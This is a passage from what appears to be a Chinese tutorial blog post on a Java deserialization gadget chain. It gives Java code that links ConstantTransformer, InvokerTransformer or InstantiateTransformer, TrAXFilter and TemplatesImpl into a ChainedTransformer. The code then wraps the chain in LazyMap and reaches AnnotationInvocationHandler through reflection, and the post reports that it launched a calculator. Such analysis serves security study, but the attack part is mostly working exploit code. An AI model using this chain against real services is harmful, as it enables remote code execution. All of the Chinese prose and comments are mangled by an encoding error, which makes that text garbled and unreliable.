<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span><span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//æˆ‘ä»¬å¯ä»¥æ„é€ transformers</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>iTransformers <span class="token operator">=</span> transformers<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">Object</span> object<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iTransformers<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//ä¾æ¬¡å¾ªç¯æ¯ä¸ªtransformer,å½“å‰transformer.transform(object)çš„è¿”å›å€¼ä¼šç›´æ¥å˜æˆä¸‹ä¸€ä¸ªtransformer.trnasform(object)ä¸­çš„object</span>
        object <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iTransformers<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> object<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä½†æ˜¯ï¼Œæˆ‘ä»¬è¿˜å·®ä¸€ä¸ªå¼€å¤´çš„transformerã€‚ <code>TrAXFilter.getConstructor.newInstance()</code>ä¸­çš„<code>TrAXFilter</code>ç±»ï¼Œæˆ‘ä»¬éœ€è¦æƒ³åŠæ³•è®©ä»–ä¹Ÿèƒ½ç”¨<code>ChainedTransformer</code>è¿æ¥èµ·æ¥ï¼Œè€Œä¸æ˜¯æ‰‹åŠ¨å»ç”¨<code>.transform(input)</code>ä½œä¸º<code>input</code>ä¼ å…¥è¿›å»ã€‚</p>
<p><strong>æ–¹æ³•ä¸€ï¼š</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
    <span class="token comment">/* è¿™é‡Œéœ€è¦æ·»åŠ ä¸€ä¸ªtransformerï¼Œè®©ä»–èƒ½å¤Ÿè¿”å›TrAXFilter classï¼Œä½œä¸ºä¸‹ä¸€ä¸ªtransformerçš„input */</span>
    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getConstructor"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"newInstance"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>templates<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>æ–¹æ³•äºŒï¼š</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
    <span class="token comment">/* è¿™é‡Œéœ€è¦æ·»åŠ ä¸€ä¸ªtransformerï¼Œè®©ä»–èƒ½å¤Ÿè¿”å›TrAXFilter classï¼Œä½œä¸ºä¸‹ä¸€ä¸ªtransformerçš„input */</span>
    <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>templates<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p>æˆ‘ä»¬æœ€ç»ˆé€‰æ‹©ä½¿ç”¨æˆ‘ä»¬åœ¨cc1ä¸­ç”¨åˆ°çš„<code>ConstantTransformer</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Object</span> constantToReturn<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>iConstant <span class="token operator">=</span> constantToReturn<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">Object</span> input<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>iConstant<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>é€šè¿‡è¿™ä¸ªç±»ï¼Œæˆ‘ä»¬å¯ä»¥å°†<code>TrAXFilter</code>ç±»ä¼ è¿›å»ï¼Œä½œä¸º<code>transformers</code>çš„å¼€å¤´ï¼Œè¿™æ ·æˆ‘ä»¬çš„é“¾å°±ä¸²ä¸Šäº†ï¼</p>
<p><strong>æ–¹æ³•ä¸€ï¼š</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
<span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>trAXFilterClass<span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getConstructor"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"newInstance"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>templates<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
chainedTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è§¦å‘ç¬¬ä¸€æ¡ConstantTransformerï¼Œä¼ å…¥å‚æ•°éšä¾¿å†™ï¼Œä¸å½±å“ï¼Œå› ä¸ºConstantTrnasformerçš„transformå‡½æ•°ä¸ä¼šç”¨åˆ°å®ƒè‡ªå·±çš„inputå‚æ•°</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>æ–¹æ³•äºŒï¼š</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
<span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>templates<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
chainedTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è§¦å‘ç¬¬ä¸€æ¡ConstantTransformerï¼Œä¼ å…¥å‚æ•°éšä¾¿å†™ï¼Œä¸å½±å“ï¼Œå› ä¸ºConstantTrnasformerçš„transformå‡½æ•°ä¸ä¼šç”¨åˆ°å®ƒè‡ªå·±çš„inputå‚æ•°</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è®¡ç®—å™¨æ‰§è¡ŒæˆåŠŸã€‚</p>
<h4 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h4><p><span id="lazyMap">psï¼šCC1çš„LazyMapåŠä¹‹åçš„éƒ¨åˆ†ä¹Ÿå’Œè¿™ä¸ªä¸€æ ·ã€‚</span></p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦å¯»æ‰¾è§¦å‘<code>ChainedTrasnformer.transform()</code>çš„æ–¹æ³•ã€‚åœ¨CC1é“¾ä¸­ï¼Œæˆ‘ä»¬ç”¨åˆ°äº†<code>LazyMap.get()</code>ï¼Œå…¶ä¸­invokeäº†<code>transform()</code>æ–¹æ³•ã€‚å½“æˆ‘ä»¬æŠŠ<code>factory</code>èµ‹å€¼ä¸º<code>chainedTransformer</code>å°±å¯ä»¥è§¦å‘å…¶<code>transform()</code>æ–¹æ³•äº†ã€‚</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">Object</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">super</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Object</span> value <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>factory<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">super</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> value<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä½†å› ä¸º<code>LazyMap</code>çš„constructoræ˜¯protectedçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç›´æ¥æ„é€ ï¼Œæˆ‘ä»¬å‘ç°LazyMapçš„decorate()æ–¹æ³•å¯ä»¥è¿”å›ä¸€ä¸ªinstanceï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Map</span> <span class="token function">decorate</span><span class="token punctuation">(</span><span class="token class-name">Map</span> map<span class="token punctuation">,</span> <span class="token class-name">Transformer</span> factory<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">LazyMap</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> factory<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿™æ ·å†™ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Map</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">LazyMap</span> lazyMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">LazyMap</span><span class="token punctuation">)</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¾—åˆ°lazyMap instance</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>é‚£ä¹ˆæ€æ ·è§¦å‘LazyMap.get()æ–¹æ³•å‘¢ï¼Ÿæœ€å¥½æ˜¯readObjectå†…éƒ¨å¯ä»¥ç”¨åˆ°çš„ã€‚</p>
<h4 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h4><p>æˆ‘ä»¬å‘ç°åœ¨<code>AnnotationInvocationHandler</code>ä¸­çš„<code>invoke()</code>è°ƒç”¨äº†<code>memberValues.get(member)</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Object</span> proxy<span class="token punctuation">,</span> <span class="token class-name">Method</span> method<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">String</span> member <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> paramTypes <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">getParameterTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Handle Object and Annotation methods</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>member<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"equals"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> paramTypes<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span>
        paramTypes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token function">equalsImpl</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">assert</span> paramTypes<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>member<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"toString"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token function">toStringImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>member<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token function">hashCodeImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>member<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"annotationType"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> type<span class="token punctuation">;</span>

    <span class="token comment">// Handle annotation member accessors</span>
    <span class="token class-name">Object</span> result <span class="token operator">=</span> memberValues<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>member<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿™é‡Œè°ƒç”¨äº†get()</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>result <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IncompleteAnnotationException</span><span class="token punctuation">(</span>type<span class="token punctuation">,</span> member<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>result <span class="token keyword">instanceof</span> <span class="token class-name">ExceptionProxy</span><span class="token punctuation">)</span>
        <span class="token keyword">throw</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ExceptionProxy</span><span class="token punctuation">)</span> result<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">generateException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name">Array</span><span class="token punctuation">.</span><span class="token function">getLength</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
        result <span class="token operator">=</span> <span class="token function">cloneArray</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¦‚æœæˆ‘ä»¬æŠŠmemberValuesçš„å€¼æ”¹ä¸ºLazymapå¯¹è±¡ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è§¦å‘æ¼æ´äº†ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡AnnotationInvocationHandlerçš„æ„é€ å‡½æ•°æ¥è¾¾åˆ°è¿™ä¸ªç›®çš„ã€‚</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">AnnotationInvocationHandler</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">Annotation</span><span class="token punctuation">></span></span> type<span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> memberValues<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>type <span class="token operator">=</span> type<span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>memberValues <span class="token operator">=</span> memberValues<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä½†å°è¯•åå‘ç°å¹¶ä¸èƒ½ç›´æ¥åˆ›å»ºå¯¹è±¡</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E9%9B%86%E5%90%88-4/image-20211201153006916.png" alt="image-20211201153006916" loading="lazy"> </p>
<p>å› ä¸ºAnnotationInvocationHandleræ— æ³•ç›´æ¥è®¿é—®ï¼Œäºæ˜¯æˆ‘ä»¬ä½¿ç”¨åå°„æ–¹æ³•</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> classToSerialize <span class="token operator">=</span> <span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">;</span>
<span class="token keyword">final</span> <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> constructor <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>classToSerialize<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">InvocationHandler</span> secondInvocationHandler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Override</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> lazyMap<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//AnnotationInvocationHandleræ˜¯å®ç°InvocationHandlerç±»çš„ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æŠŠä»–è½¬åŒ–ä¸ºInvocationHandlerç±»ï¼Œä¼ å…¥æˆ‘ä»¬çš„lazyMap</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä½†æˆ‘ä»¬åº”è¯¥å¦‚ä½•callåˆ°<code>secondInvocationHandler</code>çš„<code>invoke()</code>æ–¹æ³•å‘¢?</p>
<h4 id="åŠ¨æ€ä»£ç†-InvocationHandler-amp-AnnotationInvocationHandler"><a href="#åŠ¨æ€ä»£ç†-InvocationHandler-amp-AnnotationInvocationHandler" class="headerlink" title="åŠ¨æ€ä»£ç† - InvocationHandler &amp; AnnotationInvocationHandler"></a>åŠ¨æ€ä»£ç† - InvocationHandler &amp; AnnotationInvocationHandler</h4><p><a target="_blank" rel="noopener" href="https://leihehehe.github.io/2021/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86-5/">Javaååºåˆ—åŒ–æ¼æ´ä¹‹é™æ€ä»£ç†ä¸åŠ¨æ€ä»£ç†(5)</a>ä¸­å·²ç»è¯¦ç»†è®²è§£è¿‡ï¼Œæ­¤å¤„çš„<code>InvocationHandler</code>æ¥å£å…¶å®å°±æ˜¯è´Ÿè´£æä¾›è°ƒç”¨ä»£ç†æ“ä½œï¼Œåœ¨åŠ¨æ€ä»£ç†ä¸­ï¼Œä¸€ä¸ªä»£ç†ç±»å¿…é¡»è¦å®ç°<code>InvocationHandler</code>ç±»ï¼Œä»è€Œæ¯å½“å®¢æˆ·è°ƒç”¨ä»£ç†ç±»åŠ¨æ€ç”Ÿæˆçš„ä»£ç†instanceçš„æ–¹æ³•çš„æ—¶å€™ï¼Œ<strong>éƒ½ä¼šè¢«è½¬å‘</strong>è‡³ä»£ç†ç±»çš„<code>invoke()</code>æ–¹æ³•ã€‚æˆ‘ä»¬å¾—çŸ¥<code>AnnotationInvocationHandler implements InvocationHandler</code>ï¼Œæ˜¯å¦æ„å‘³ç€ï¼Œ<code>AnnotationInvocationHandler</code>å°±å¯ä»¥ä½œä¸ºä¸€ä¸ªä»£ç†ç±»å‘¢ï¼Ÿ</p>
